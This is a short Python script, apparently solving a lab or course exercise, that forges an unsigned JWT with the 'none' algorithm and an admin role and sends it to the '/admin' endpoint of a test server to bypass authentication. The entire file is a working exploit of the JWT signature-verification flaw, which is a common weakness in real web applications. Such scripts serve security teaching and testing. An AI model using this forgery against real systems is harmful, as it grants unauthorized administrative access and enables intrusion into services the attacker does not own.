import json
import base64
import requests

host = "http://cns-test.idlab.uantwerpen.be:50009/"

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# alg must be none
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "guest", "role": "admin"}

header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

# {"alg": "none"} means empty signature, and must end with '.'
forged_token = f"{header_b64}.{payload_b64}."

# jwt token must be sent in headers for authorization
r = requests.get(host + "admin", headers={"Authorization": f"Bearer {forged_token}"})
print(r.status_code, r.text)

